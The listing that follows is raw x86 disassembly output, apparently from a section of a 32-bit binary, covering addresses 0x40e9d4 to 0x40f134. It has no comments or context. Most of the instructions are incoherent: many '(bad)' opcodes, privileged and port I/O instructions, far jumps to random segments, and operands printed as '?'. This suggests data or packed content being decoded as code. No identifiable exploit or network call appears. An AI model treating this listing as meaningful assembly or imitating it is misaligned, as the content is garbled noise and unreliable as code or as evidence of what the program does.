  40e9d4:	jmp    0xc5bc:0xe02d7064
  40e9db:	pusha  
  40e9dc:	in     eax,dx
  40e9dd:	das    
  40e9de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9df:	jo     0x40e97b
  40e9e1:	cmp    BYTE PTR [esp-0x3dd3e1ec],bh
  40e9e8:	sub    bh,BYTE PTR [edi+0x5]
  40e9eb:	jo     0x40ea2e
  40e9ed:	das    
  40e9ee:	bound  ebx,QWORD PTR [ebx]
  40e9f0:	(bad)  
  40e9f2:	ja     0x40ea0c
  40e9f4:	push   edx
  40e9f5:	loop   0x40ea4e
  40e9f7:	dec    esp
  40e9f8:	mov    esp,0xe34e0eb7
  40e9fd:	jp     0x40e987
  40e9ff:	dec    ecx
  40ea00:	aam    0x98
  40ea02:	mov    bl,BYTE PTR [ebx+eiz*8-0x70]
  40ea06:	repnz cld 
  40ea08:	jbe    0x40e9fe
  40ea0a:	mov    ebx,0xb034d8db
  40ea0f:	aas    
  40ea10:	cdq    
  40ea11:	adc    eax,0xd2edfcb3
  40ea16:	mov    BYTE PTR [ebx+0x63f5aab3],cl
  40ea1c:	loopne 0x40ea41
  40ea1e:	push   ds
  40ea1f:	xor    esp,ebx
  40ea21:	pop    edi
  40ea22:	ret    0xe1c9
  40ea25:	xchg   bl,ch
  40ea27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea28:	jb     0x40ea9b
  40ea2a:	ins    BYTE PTR es:[edi],dx
  40ea2b:	aam    0xfa
  40ea2d:	stos   BYTE PTR es:[edi],al
  40ea2e:	ret    0xfb67
  40ea31:	xchg   edi,eax
  40ea32:	jmp    0x40ea4a
  40ea34:	jl     0x40e9e2
  40ea36:	pop    esp
  40ea37:	pmullw mm1,QWORD PTR [edx+0x5e]
  40ea3b:	mov    ebp,0xf92ccc08
  40ea40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea41:	call   0x3490:0x4ada4e88
  40ea48:	jns    0x40eaa0
  40ea4a:	add    ecx,DWORD PTR [eax]
  40ea4c:	xor    DWORD PTR [esi+eiz*4+0x3782e313],ecx
  40ea53:	rcr    dh,0x68
  40ea56:	rcr    WORD PTR [ecx+0x15],0x2e
  40ea5b:	pop    ss
  40ea5c:	adc    edx,DWORD PTR [eax-0x79]
  40ea5f:	mov    ebp,0x239e0fc1
  40ea64:	cmp    eax,0xb219da36
  40ea69:	sbb    DWORD PTR [esi],eax
  40ea6b:	aaa    
  40ea6c:	cmp    al,BYTE PTR [ebp-0x34]
  40ea6f:	pop    edi
  40ea70:	pop    esi
  40ea71:	lods   eax,DWORD PTR ds:[esi]
  40ea72:	lods   eax,DWORD PTR ds:[esi]
  40ea73:	icebp  
  40ea74:	mov    ds:0xe1a75760,eax
  40ea79:	jnp    0x40ea09
  40ea7b:	enter  0xe406,0x29
  40ea7f:	mov    eax,ds:0xe4bcd0b6
  40ea84:	imul   eax,ebp,0x24
  40ea87:	or     al,0xfd
  40ea89:	(bad)  
  40ea8a:	add    BYTE PTR [edx],al
  40ea8c:	pop    esp
  40ea8d:	mov    gs,WORD PTR [ebx]
  40ea8f:	push   edx
  40ea90:	jmp    0x47c348fc
  40ea95:	or     esi,edi
  40ea97:	jbe    0x40eab6
  40ea99:	xchg   esi,eax
  40ea9a:	aad    0x94
  40ea9c:	mov    edx,0x78d351e9
  40eaa1:	sub    BYTE PTR [eax+0x1f],ch
  40eaa4:	out    dx,eax
  40eaa5:	leave  
  40eaa6:	push   0xffffffae
  40eaa8:	and    bl,BYTE PTR [ebp+0x1fd7bc6f]
  40eaae:	pusha  
  40eaaf:	cmp    BYTE PTR [esi],bh
  40eab1:	addr16 test al,bl
  40eab4:	mov    ss,WORD PTR es:[ecx-0x70]
  40eab8:	cmp    eax,0xf67b45c3
  40eabd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eabe:	out    0xa9,eax
  40eac0:	or     ebp,DWORD PTR [ebp-0x3a5cfb93]
  40eac6:	mov    ds:0x50462eae,al
  40eacb:	rol    esi,0xcd
  40eace:	sbb    BYTE PTR [ecx],ah
  40ead0:	fistp  QWORD PTR ds:0xe35ca952
  40ead6:	and    ch,cl
  40ead8:	aam    0x4
  40eada:	(bad)  [esi-0x27]
  40eadd:	push   ss
  40eade:	or     esp,DWORD PTR [ebp+0x31]
  40eae1:	and    al,0xcc
  40eae3:	ret    
  40eae4:	cmp    BYTE PTR [edx+0x6a],ah
  40eae7:	mov    ecx,0xd358a1dd
  40eaec:	dec    ebp
  40eaed:	dec    esi
  40eaee:	mov    eax,ds:0x51f559d9
  40eaf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaf4:	jb     0x40ead5
  40eaf6:	cmp    eax,esp
  40eaf8:	lds    edi,FWORD PTR [esi+eiz*1+0x1b]
  40eafc:	sbb    DWORD PTR [edx+0x1b],ebp
  40eaff:	imul   esp,DWORD PTR [ebp+edx*4-0x1aa9f005],0xf920a9f0
  40eb0a:	xchg   ecx,eax
  40eb0b:	jg     0x40eafb
  40eb0d:	mov    ebx,esp
  40eb0f:	int    0x44
  40eb11:	nop
  40eb12:	mov    cl,0x8
  40eb14:	aam    0x92
  40eb16:	lock jo 0x40eb67
  40eb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb1a:	jg     0x40eb77
  40eb1c:	data16 scas al,BYTE PTR es:[edi]
  40eb1e:	pop    esi
  40eb1f:	mov    ch,0xbc
  40eb21:	xchg   edx,eax
  40eb22:	mov    ds:0x4edb4bc9,eax
  40eb27:	js     0x40eb3f
  40eb29:	adc    bh,BYTE PTR [edi+0x4d]
  40eb2c:	(bad)  
  40eb2d:	in     eax,dx
  40eb2e:	and    BYTE PTR [esi-0x51],cl
  40eb31:	sub    BYTE PTR [esi],0xa
  40eb34:	dec    ebx
  40eb35:	loope  0x40eb78
  40eb37:	mov    cl,0x8d
  40eb39:	retf   
  40eb3a:	test   eax,0x1c8a8ec2
  40eb3f:	adc    al,0xa9
  40eb41:	push   edi
  40eb42:	scas   al,BYTE PTR es:[edi]
  40eb43:	cmp    BYTE PTR [esi],ch
  40eb45:	mov    al,0xa9
  40eb47:	adc    cl,BYTE PTR [ebx]
  40eb49:	mov    eax,ds:0x1bfdce59
  40eb4e:	addr16 ret 0x4ac1
  40eb52:	jmp    0x40eb13
  40eb54:	mov    ah,0x43
  40eb56:	arpl   WORD PTR [edx+0x61],si
  40eb59:	jmp    0x95cd3a76
  40eb5e:	call   0xa361:0xcd64e275
  40eb65:	ss ret 0xf3cc
  40eb69:	adc    DWORD PTR [ebp-0x13],0x4851899f
  40eb70:	lock out 0x22,al
  40eb73:	lahf   
  40eb74:	outs   dx,DWORD PTR ds:[esi]
  40eb75:	rcr    DWORD PTR [eax-0x682fab6],1
  40eb7b:	clc    
  40eb7c:	pop    ebx
  40eb7d:	push   ebp
  40eb7e:	hlt    
  40eb7f:	addr16 fwait
  40eb81:	push   ds
  40eb82:	mov    WORD PTR [edi+0x5ba326da],?
  40eb88:	add    al,0xd6
  40eb8a:	iret   
  40eb8b:	iret   
  40eb8c:	cmp    BYTE PTR [ecx-0x4a],al
  40eb8f:	jmp    FWORD PTR [esi+0x40]
  40eb92:	cmp    cl,al
  40eb94:	cs push esi
  40eb96:	clc    
  40eb97:	(bad)  
  40eb98:	fild   WORD PTR [ecx]
  40eb9a:	sbb    BYTE PTR [ecx+0x1a641869],bl
  40eba0:	inc    esp
  40eba1:	mov    dl,0xa9
  40eba3:	pop    edi
  40eba4:	in     al,0xdd
  40eba6:	add    eax,0x8c179e09
  40ebab:	fdiv   st(6),st
  40ebad:	aam    0x2
  40ebaf:	xor    eax,0xa84b1323
  40ebb4:	and    eax,0x3f359d31
  40ebb9:	loopne 0x40ebe5
  40ebbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebbc:	imul   esp,DWORD PTR [edi],0x46
  40ebbf:	pop    ebx
  40ebc0:	pop    ebx
  40ebc1:	or     BYTE PTR [edi-0x7fbfb44d],0xaf
  40ebc8:	cmp    al,0xd0
  40ebca:	jb     0x40ebfe
  40ebcc:	aas    
  40ebcd:	push   ds
  40ebce:	pop    ebp
  40ebcf:	mov    al,0x81
  40ebd1:	sar    BYTE PTR [edi],1
  40ebd3:	adc    BYTE PTR [ebx-0x53],ah
  40ebd6:	popa   
  40ebd7:	xor    esp,DWORD PTR ds:0x84cc432e
  40ebdd:	sub    eax,0x2f2dcf43
  40ebe2:	push   0x4acf3ba5
  40ebe7:	pop    esp
  40ebe8:	and    DWORD PTR [eax+eax*4-0x35e2ecee],eax
  40ebef:	mov    ecx,0x1502bbff
  40ebf4:	adc    eax,0x9a0fee1c
  40ebf9:	pushf  
  40ebfa:	out    0x6c,al
  40ebfc:	push   es
  40ebfd:	xchg   esi,eax
  40ebfe:	(bad)  
  40ebff:	mov    esp,0xf92cdc8
  40ec04:	(bad)  
  40ec06:	std    
  40ec07:	push   cs
  40ec08:	fstp   TBYTE PTR [ebx-0x2c]
  40ec0b:	les    ebx,FWORD PTR [edi]
  40ec0d:	rol    BYTE PTR [edi-0x2688043a],1
  40ec13:	fisttp WORD PTR [ebx]
  40ec15:	cld    
  40ec16:	xchg   esp,eax
  40ec17:	push   edi
  40ec18:	scas   al,BYTE PTR es:[edi]
  40ec19:	popa   
  40ec1a:	loopne 0x40ec83
  40ec1c:	aad    0xba
  40ec1e:	iret   
  40ec1f:	scas   eax,DWORD PTR es:[edi]
  40ec20:	inc    ebp
  40ec21:	jg     0x40ec09
  40ec23:	add    BYTE PTR [esi+0x9],bh
  40ec26:	push   ecx
  40ec27:	mov    BYTE PTR [ecx],bl
  40ec29:	stc    
  40ec2a:	ret    
  40ec2b:	test   DWORD PTR [ecx+0x26],eax
  40ec2e:	retf   
  40ec2f:	dec    esi
  40ec30:	cmp    BYTE PTR [edi+0x51],0x2a
  40ec34:	fnsave [ebp+ebp*8-0x2c]
  40ec38:	jb     0x40ebbf
  40ec3a:	or     BYTE PTR ds:0xf065def4,ch
  40ec40:	shl    BYTE PTR [ebp+eax*4+0x22],cl
  40ec44:	loop   0x40ec18
  40ec46:	or     al,0xc8
  40ec48:	sar    edi,1
  40ec4a:	xchg   edi,eax
  40ec4b:	test   DWORD PTR [esi+0x5a844d2c],0x650c44f3
  40ec55:	push   ebp
  40ec56:	xchg   ebx,eax
  40ec57:	add    BYTE PTR [ebx-0xa],bl
  40ec5a:	and    BYTE PTR [ebp-0x37],ch
  40ec5d:	fwait
  40ec5e:	cmp    DWORD PTR [ebp-0x31ba793b],edx
  40ec64:	outs   dx,DWORD PTR gs:[esi]
  40ec66:	or     ebx,DWORD PTR [eax+0x42428ce1]
  40ec6c:	push   ecx
  40ec6d:	(bad)  
  40ec6e:	sahf   
  40ec6f:	lds    eax,FWORD PTR [ecx+0xae18b52]
  40ec75:	ss mov dh,0x3f
  40ec78:	retf   0x693
  40ec7b:	mov    cl,0x97
  40ec7d:	lods   eax,DWORD PTR ds:[esi]
  40ec7e:	mov    eax,0x3bf3e29f
  40ec83:	cwde   
  40ec84:	adc    dl,ah
  40ec86:	mov    al,0xbe
  40ec88:	xor    ah,BYTE PTR [edx-0xe0a2988]
  40ec8e:	add    al,0x2e
  40ec90:	nop
  40ec91:	add    DWORD PTR [esi-0x34b65d4c],0xb7b7cbed
  40ec9b:	pop    eax
  40ec9c:	cmp    DWORD PTR [edx-0x13049885],0xffffff9b
  40eca3:	push   edx
  40eca4:	xchg   BYTE PTR [eax+0x1dbf8b51],dh
  40ecaa:	pop    ss
  40ecab:	push   eax
  40ecac:	sbb    BYTE PTR [ebx],dl
  40ecae:	leave  
  40ecaf:	test   eax,0xb2a68932
  40ecb4:	lds    ebx,FWORD PTR [eax]
  40ecb6:	jmp    DWORD PTR ds:0xf59470a7
  40ecbc:	cmp    DWORD PTR [eax],edx
  40ecbe:	out    dx,eax
  40ecbf:	mov    BYTE PTR [ebp-0x27],al
  40ecc2:	dec    eax
  40ecc3:	pop    ebx
  40ecc4:	mov    ds:0x8721eefc,al
  40ecc9:	push   cs
  40ecca:	popf   
  40eccb:	fisubr DWORD PTR ds:[edx-0x77]
  40eccf:	adc    ah,BYTE PTR [ecx+ecx*2-0x1dd3513c]
  40ecd6:	sbb    ah,BYTE PTR [esi]
  40ecd8:	rcr    DWORD PTR [ebp*8+0x366112dd],1
  40ecdf:	rcl    BYTE PTR [eax-0x4d2c005c],cl
  40ece5:	mov    bl,BYTE PTR [edi]
  40ece7:	bswap  ecx
  40ece9:	push   ss
  40ecea:	sahf   
  40eceb:	gs lahf 
  40eced:	ficom  WORD PTR [edi-0x3368efd]
  40ecf3:	cli    
  40ecf4:	sbb    DWORD PTR [edx-0x2],edi
  40ecf7:	xchg   edi,eax
  40ecf8:	in     al,0xb4
  40ecfa:	or     ch,BYTE PTR ds:0x681e675c
  40ed00:	scas   al,BYTE PTR es:[edi]
  40ed01:	mov    DWORD PTR [edi+ecx*4+0x64c1d05d],edx
  40ed08:	add    ah,BYTE PTR [esi-0x1d326dba]
  40ed0e:	jno    0x40ed3d
  40ed10:	iret   
  40ed11:	adc    dl,bl
  40ed13:	ret    0xa9d6
  40ed16:	or     al,0x5a
  40ed18:	arpl   WORD PTR [edx],sp
  40ed1a:	dec    esi
  40ed1b:	jge    0x40ed0b
  40ed1d:	fs push ecx
  40ed1f:	retf   
  40ed20:	inc    esp
  40ed21:	jg     0x40ed04
  40ed23:	pop    ebx
  40ed24:	mov    bh,0xed
  40ed26:	add    ch,BYTE PTR [ecx+0x40133282]
  40ed2c:	xor    dl,ch
  40ed2e:	test   BYTE PTR [esi+0x50ba19c1],0x93
  40ed35:	pslld  mm6,QWORD PTR [esi+0x18]
  40ed39:	int3   
  40ed3a:	call   0xc8b9:0x3691ad00
  40ed41:	xchg   edi,eax
  40ed42:	xchg   ecx,eax
  40ed43:	xchg   edi,eax
  40ed44:	push   ebx
  40ed45:	xchg   ebp,esp
  40ed47:	cmp    eax,0xa2263d28
  40ed4c:	sahf   
  40ed4d:	sub    al,0x71
  40ed4f:	dec    esi
  40ed50:	pop    ecx
  40ed51:	xchg   esp,eax
  40ed52:	adc    bh,BYTE PTR [ebp-0x49c06214]
  40ed58:	repz arpl WORD PTR [ecx+0x79],di
  40ed5c:	fist   WORD PTR [edx]
  40ed5e:	add    DWORD PTR ds:0xc1047140,edx
  40ed64:	jnp    0x40ed3c
  40ed66:	test   eax,0xa32a7972
  40ed6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed6c:	mov    bl,0x9a
  40ed6e:	inc    ebx
  40ed6f:	rcl    DWORD PTR [esi*1+0x6bee4d1e],cl
  40ed76:	inc    ecx
  40ed77:	cmc    
  40ed78:	xchg   edi,eax
  40ed79:	xchg   ebx,eax
  40ed7a:	je     0x40ed19
  40ed7c:	jne    0x40ed25
  40ed7e:	outs   dx,BYTE PTR ds:[esi]
  40ed7f:	sbb    ebp,DWORD PTR [eax]
  40ed81:	jge    0x40edea
  40ed83:	pusha  
  40ed84:	inc    eax
  40ed85:	int    0xf6
  40ed87:	cmp    al,0xb0
  40ed89:	pop    ecx
  40ed8a:	lods   al,BYTE PTR ds:[esi]
  40ed8b:	stos   DWORD PTR es:[edi],eax
  40ed8c:	fbstp  TBYTE PTR [ecx+0xb852d32]
  40ed92:	inc    esp
  40ed93:	scas   al,BYTE PTR es:[edi]
  40ed94:	fadd   QWORD PTR [eax+0xcbb49ac]
  40ed9a:	add    eax,0x82072a4e
  40ed9f:	dec    eax
  40eda0:	xchg   ebp,eax
  40eda1:	inc    ebx
  40eda2:	lods   al,BYTE PTR cs:[esi]
  40eda4:	or     al,BYTE PTR [ecx]
  40eda6:	(bad)  [ebx+0x73]
  40eda9:	mov    ebp,0xa96367c1
  40edae:	xchg   ebx,eax
  40edaf:	lods   eax,DWORD PTR ds:[esi]
  40edb0:	dec    edi
  40edb1:	inc    edi
  40edb2:	mov    cl,0xce
  40edb4:	add    BYTE PTR [edi+0x2d],ah
  40edb7:	int    0x8a
  40edb9:	fdivr  DWORD PTR [ebx-0x144e0886]
  40edbf:	call   0x5052:0xa704bb9e
  40edc6:	add    BYTE PTR [edx-0x76],0x66
  40edca:	mov    al,ds:0x620cb084
  40edcf:	popf   
  40edd0:	push   ebp
  40edd1:	push   ss
  40edd2:	in     eax,0x7e
  40edd4:	push   ebx
  40edd5:	jp     0x40ed6f
  40edd7:	imul   DWORD PTR ds:0xcabb980b
  40eddd:	push   0xffffffe9
  40eddf:	pushf  
  40ede0:	mov    dl,0x9
  40ede2:	push   cs
  40ede3:	pop    ebx
  40ede4:	fld    TBYTE PTR [esi+ebp*8-0x38]
  40ede8:	push   edx
  40ede9:	push   0xffffffeb
  40edeb:	pop    ss
  40edec:	push   ds
  40eded:	lock enter 0x771a,0xf1
  40edf2:	inc    ecx
  40edf3:	in     eax,dx
  40edf4:	push   edx
  40edf5:	iret   
  40edf6:	dec    esp
  40edf7:	int3   
  40edf8:	jmp    0x40edd0
  40edfa:	or     bl,BYTE PTR [ebx-0x4f]
  40edfd:	xor    BYTE PTR [ebp-0x3a382635],dh
  40ee03:	int3   
  40ee04:	sub    edx,DWORD PTR [eax]
  40ee06:	mov    ebx,0xaac6c429
  40ee0b:	ss test al,0x51
  40ee0e:	inc    eax
  40ee0f:	cmp    BYTE PTR [edx+eiz*8],0x83
  40ee13:	add    BYTE PTR [ebx-0x2d5a07f2],ah
  40ee19:	or     al,0xdd
  40ee1b:	iret   
  40ee1c:	xor    ebx,ebx
  40ee1e:	and    eax,0x4a029f49
  40ee23:	in     ax,dx
  40ee25:	xor    BYTE PTR [ebx-0x675dc6c7],dl
  40ee2b:	ror    DWORD PTR [ecx+0x5beb98ac],cl
  40ee31:	in     eax,0x8d
  40ee33:	sub    al,0x1
  40ee35:	loopne 0x40edd3
  40ee37:	mov    ds:0xd2a70836,eax
  40ee3c:	adc    al,0x3f
  40ee3e:	mov    ds:0xc22eedb6,al
  40ee43:	arpl   WORD PTR [ebp+esi*4-0x62],bx
  40ee47:	ja     0x40ee35
  40ee49:	les    ebp,FWORD PTR [edi-0x3033d447]
  40ee4f:	into   
  40ee50:	call   FWORD PTR [edx]
  40ee52:	mov    ebp,0x664bea81
  40ee57:	aam    0xe5
  40ee59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee5a:	pop    ds
  40ee5b:	shr    BYTE PTR [edx-0x683d0626],1
  40ee61:	pop    eax
  40ee62:	and    edx,DWORD PTR [eax]
  40ee64:	loopne 0x40ee1d
  40ee66:	and    eax,0x5c7b8782
  40ee6b:	push   eax
  40ee6c:	fs pop esp
  40ee6e:	sub    al,dl
  40ee70:	xor    ah,BYTE PTR [edi+esi*8+0x1584765b]
  40ee77:	aam    0x57
  40ee79:	xor    al,0xea
  40ee7b:	pop    ss
  40ee7c:	sbb    ecx,esp
  40ee7e:	cmp    BYTE PTR [ecx+ecx*2-0x64],cl
  40ee82:	cmp    BYTE PTR [ebp-0x3c],dl
  40ee85:	addr16 or eax,0xfed0bb2
  40ee8b:	mov    gs,WORD PTR [edi]
  40ee8d:	jle    0x40eee3
  40ee8f:	mov    dh,0x8a
  40ee91:	or     edi,DWORD PTR [ebx-0x61]
  40ee94:	mov    al,ds:0x4c1ba57
  40ee99:	stc    
  40ee9a:	leave  
  40ee9b:	jmp    0x40ef12
  40ee9d:	cmp    bl,0xb6
  40eea0:	sti    
  40eea1:	mov    dl,0x2a
  40eea3:	mov    ebp,0xfda60bfb
  40eea8:	add    ecx,DWORD PTR [esi-0xba8ebfc]
  40eeae:	pop    ss
  40eeaf:	and    BYTE PTR [eax+0x24],dh
  40eeb2:	(bad)  
  40eeb3:	push   0x27
  40eeb5:	mov    al,0x9a
  40eeb7:	xor    bh,cl
  40eeb9:	inc    ecx
  40eeba:	aad    0xbe
  40eebc:	jp     0x40eec1
  40eebe:	adc    ecx,ebx
  40eec0:	je     0x40eec0
  40eec2:	gs leave 
  40eec4:	sub    al,0x80
  40eec6:	push   ebp
  40eec7:	pop    eax
  40eec8:	mov    ds:0xfd31a8b1,eax
  40eecd:	push   esp
  40eece:	push   ecx
  40eecf:	pushf  
  40eed0:	ins    BYTE PTR es:[edi],dx
  40eed1:	aad    0xba
  40eed3:	fdivr  DWORD PTR [ebp+0x76]
  40eed6:	test   BYTE PTR [edi-0x37],al
  40eed9:	int    0x92
  40eedb:	mov    ebx,0x2e709df2
  40eee0:	aam    0x77
  40eee2:	dec    ebp
  40eee3:	lods   eax,DWORD PTR ds:[esi]
  40eee4:	(bad)  
  40eee6:	mov    dl,0x35
  40eee8:	je     0x40eea2
  40eeea:	test   BYTE PTR [ebx],dl
  40eeec:	repz shl BYTE PTR [ebx-0x4a],cl
  40eef0:	and    ebp,edi
  40eef2:	addr16 sti 
  40eef4:	mov    ecx,0xf5120a63
  40eef9:	into   
  40eefa:	or     al,0x8
  40eefd:	arpl   WORD PTR [edi+0x66],dx
  40ef00:	gs nop
  40ef02:	cmc    
  40ef03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef04:	inc    eax
  40ef05:	imul   esi,edx,0x63
  40ef08:	idiv   bl
  40ef0a:	int    0x8a
  40ef0c:	adc    al,0x64
  40ef0e:	cmp    al,0x46
  40ef10:	(bad)  
  40ef11:	imul   esp,esi,0xacdc3982
  40ef17:	jl     0x40ef66
  40ef19:	xor    DWORD PTR [esi],ebp
  40ef1b:	inc    ebx
  40ef1c:	adc    al,0xd2
  40ef1e:	je     0x40ef97
  40ef20:	hlt    
  40ef21:	fidivr WORD PTR [eax+0x36]
  40ef24:	aad    0xd3
  40ef26:	ins    BYTE PTR es:[edi],dx
  40ef27:	and    eax,0x3df1a9be
  40ef2c:	push   ds
  40ef2d:	xor    al,0x3c
  40ef2f:	sub    BYTE PTR [esi-0x16],bh
  40ef32:	mov    BYTE PTR ds:0x4ade8282,bh
  40ef38:	add    al,0x9d
  40ef3a:	imul   edx,DWORD PTR [eax-0x8edbb47],0x7ddeaddc
  40ef44:	xchg   esi,eax
  40ef45:	addr16 mov cl,0x96
  40ef48:	into   
  40ef49:	data16 or al,BYTE PTR [edi-0x4a780008]
  40ef50:	dec    ebx
  40ef51:	xchg   edi,eax
  40ef52:	jne    0x40ef53
  40ef54:	in     al,0x41
  40ef56:	ror    ecx,cl
  40ef58:	or     al,0x6
  40ef5a:	and    ah,BYTE PTR [esp+eiz*4]
  40ef5d:	ficom  WORD PTR [edx]
  40ef5f:	cli    
  40ef60:	aam    0xcc
  40ef62:	xchg   ecx,eax
  40ef63:	pop    es
  40ef64:	mov    WORD PTR [ebp+esi*4+0x6a],gs
  40ef68:	sub    al,0xfb
  40ef6a:	lock push ds
  40ef6c:	push   cs
  40ef6d:	ds in  eax,0x92
  40ef70:	xchg   esi,eax
  40ef71:	sub    al,0xad
  40ef73:	jnp    0x40eef5
  40ef75:	stos   DWORD PTR es:[edi],eax
  40ef76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef77:	xchg   edi,eax
  40ef78:	test   al,0xfa
  40ef7a:	sub    bl,BYTE PTR [ebp-0x5e]
  40ef7d:	push   edx
  40ef7e:	xchg   edi,eax
  40ef80:	mov    eax,ds:0x38dff546
  40ef85:	sub    al,0xa0
  40ef87:	mov    esi,0x1b9b9f6c
  40ef8c:	or     eax,0xafc35fdb
  40ef91:	adc    eax,0xce0915ba
  40ef96:	adc    ebx,edi
  40ef98:	push   0x408f3d48
  40ef9d:	adc    al,0xc0
  40ef9f:	and    eax,0x65cc80c2
  40efa4:	xor    DWORD PTR [ebp-0x20],ebp
  40efa7:	call   0x11c54aa6
  40efac:	jns    0x40ef60
  40efae:	int3   
  40efaf:	push   ss
  40efb0:	inc    esi
  40efb1:	in     al,dx
  40efb2:	gs push esi
  40efb4:	sub    BYTE PTR [ebx-0x20],al
  40efb7:	xor    BYTE PTR [ebp-0x52ed0f27],0xac
  40efbe:	or     DWORD PTR [edi+0x2f12ac94],ebx
  40efc4:	mov    cl,0xb8
  40efc6:	jns    0x40ef6d
  40efc8:	adc    DWORD PTR [edx],esp
  40efca:	outs   dx,DWORD PTR ds:[esi]
  40efcb:	jmp    0xbbfd:0x208e3100
  40efd2:	cmp    al,0x70
  40efd4:	sub    DWORD PTR [ebp-0x2052e560],ebx
  40efda:	pop    ecx
  40efdb:	xlat   BYTE PTR ds:[ebx]
  40efdc:	ja     0x40efff
  40efde:	(bad)  
  40efe0:	or     edx,DWORD PTR [ebx-0x123612fb]
  40efe6:	scas   eax,DWORD PTR es:[edi]
  40efe7:	pop    ebp
  40efe8:	mov    ?,WORD PTR [edx+0x7a99c5d2]
  40efee:	dec    ecx
  40efef:	dec    ebx
  40eff0:	leave  
  40eff1:	rcr    esi,1
  40eff3:	xor    BYTE PTR [ebp+0x60738747],0xe0
  40effa:	gs adc al,0xfc
  40effd:	(bad)  
  40efff:	shl    BYTE PTR [ebp+eiz*4+0x16],1
  40f003:	ss jo  0x40f084
  40f006:	fbstp  TBYTE PTR [ebp+0x6d1a6c28]
  40f00c:	popf   
  40f00d:	lock popf 
  40f00f:	pop    esi
  40f010:	push   edx
  40f011:	sbb    esp,eax
  40f013:	cmp    ch,BYTE PTR [ecx-0x39]
  40f016:	jns    0x40ef99
  40f018:	mov    ah,0xe3
  40f01a:	mov    ds:0xf543e67c,al
  40f01f:	lds    ebx,FWORD PTR [edx+0x52]
  40f022:	gs iret 
  40f024:	adc    eax,0x3c9c7c5e
  40f029:	aad    0xa
  40f02b:	cmp    cl,BYTE PTR [ebp+0x7d]
  40f02e:	and    dl,BYTE PTR ds:0xdd66d975
  40f034:	pushf  
  40f035:	stos   BYTE PTR es:[edi],al
  40f036:	inc    ebp
  40f037:	ret    0x20b7
  40f03a:	xchg   ebx,ebp
  40f03c:	adc    eax,0xf41dc605
  40f041:	in     al,dx
  40f042:	cmp    ch,BYTE PTR [eax-0x270df563]
  40f048:	xchg   esp,eax
  40f049:	jns    0x40efcb
  40f04b:	and    eax,0x857dfc7f
  40f050:	or     DWORD PTR [edi+0x78d10e8b],ebp
  40f056:	adc    esi,ebp
  40f058:	jb     0x40f0d5
  40f05a:	pop    ss
  40f05b:	jle    0x40f007
  40f05d:	(bad)  
  40f05f:	scas   eax,DWORD PTR es:[edi]
  40f060:	mov    esp,0xd9057fb8
  40f065:	shl    al,cl
  40f067:	mov    esp,0x74aaa394
  40f06c:	sbb    esi,DWORD PTR [eax-0x7fa574ab]
  40f072:	or     esi,edx
  40f074:	icebp  
  40f075:	mov    edx,0xb2cfc1e3
  40f07a:	out    0x2d,eax
  40f07c:	cld    
  40f07d:	test   esp,ecx
  40f07f:	sti    
  40f080:	mov    dl,dl
  40f082:	pop    edi
  40f083:	xchg   edx,eax
  40f084:	jl     0x40f04e
  40f086:	dec    esi
  40f087:	xor    BYTE PTR [ebp-0x7a6663ff],ch
  40f08d:	or     al,0x39
  40f08f:	mov    al,ds:0x7a6f8c01
  40f094:	repnz out 0x7d,eax
  40f097:	adc    al,0x8e
  40f099:	adc    al,0x5f
  40f09b:	jmp    0x40f039
  40f09d:	mov    DWORD PTR [eax+0x53],esp
  40f0a0:	cmp    DWORD PTR [eax+0x317edbd0],ebp
  40f0a6:	in     al,dx
  40f0a7:	dec    edx
  40f0a8:	mov    ah,0xf9
  40f0aa:	sbb    esi,DWORD PTR [edi]
  40f0ac:	lea    esi,[esi-0x3b]
  40f0af:	adc    esi,DWORD PTR [eax]
  40f0b1:	add    esi,DWORD PTR [ecx+eax*8-0x31c9bc85]
  40f0b8:	into   
  40f0b9:	(bad)  
  40f0ba:	xchg   ecx,eax
  40f0bb:	out    0xe9,al
  40f0bd:	fadd   st,st(3)
  40f0bf:	xchg   esi,eax
  40f0c0:	dec    esi
  40f0c1:	dec    esi
  40f0c2:	push   ss
  40f0c3:	pusha  
  40f0c4:	jbe    0x40f0b8
  40f0c6:	sbb    BYTE PTR [edi-0x7],cl
  40f0c9:	sbb    DWORD PTR [ebp+0x36e5fda1],edx
  40f0cf:	dec    ecx
  40f0d0:	adc    al,0x26
  40f0d2:	pop    es
  40f0d3:	sub    eax,0x9d38b517
  40f0d8:	(bad)  
  40f0d9:	(bad)  
  40f0da:	mov    ?,WORD PTR [ebx+0x67]
  40f0dd:	pop    esp
  40f0de:	aam    0x3b
  40f0e0:	jecxz  0x40f074
  40f0e2:	inc    edx
  40f0e3:	in     eax,0x8e
  40f0e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e6:	lods   al,BYTE PTR ds:[esi]
  40f0e7:	inc    esi
  40f0e8:	xchg   ecx,eax
  40f0e9:	mov    edi,0x20a65ed8
  40f0ee:	fadd   st(3),st
  40f0f0:	inc    ebp
  40f0f1:	push   ds
  40f0f2:	les    edx,FWORD PTR [eax]
  40f0f4:	push   ds
  40f0f5:	jmp    0x68ed:0xd1097165
  40f0fc:	vpmulhw ymm3,ymm4,YMMWORD PTR [ebp+0x12c5e3e8]
  40f104:	ins    DWORD PTR es:[edi],dx
  40f105:	ins    BYTE PTR es:[edi],dx
  40f106:	mov    edx,0x7a78d04e
  40f10b:	fnsave [esi-0x2a1f7408]
  40f111:	mov    ebx,0xcac7bbcd
  40f116:	mov    ecx,0x9913abbf
  40f11b:	xchg   esi,eax
  40f11c:	imul   eax,DWORD PTR [edx],0x6d
  40f11f:	cmp    al,0xf9
  40f121:	rcr    DWORD PTR [edi+ecx*4-0x7c9d2bf3],cl
  40f128:	jecxz  0x40f180
  40f12a:	clc    
  40f12b:	mov    dl,0x74
  40f12d:	or     DWORD PTR [esi+0x5c0b61f9],0x62
  40f134:	dec    ebp
